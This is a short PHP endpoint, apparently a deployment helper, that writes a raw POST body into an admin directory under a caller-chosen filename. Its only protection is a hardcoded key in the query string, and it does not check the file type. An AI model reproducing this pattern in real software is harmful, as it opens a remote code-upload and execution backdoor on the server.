<?php
// upload_admin.php - 上传文件到 admin 目录
if (!isset($_GET['key']) || $_GET['key'] !== 'godaily2026') { http_response_code(403); exit; }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { echo 'POST only'; exit; }
$content = file_get_contents('php://input');
$filename = isset($_GET['name']) ? basename($_GET['name']) : 'upload.txt';
$targetDir = __DIR__ . '/admin/';
$targetFile = $targetDir . $filename;
$ok = file_put_contents($targetFile, $content);
if ($ok !== false) {
    echo "OK:$ok:" . $targetFile;
} else {
    echo "FAILED";
}
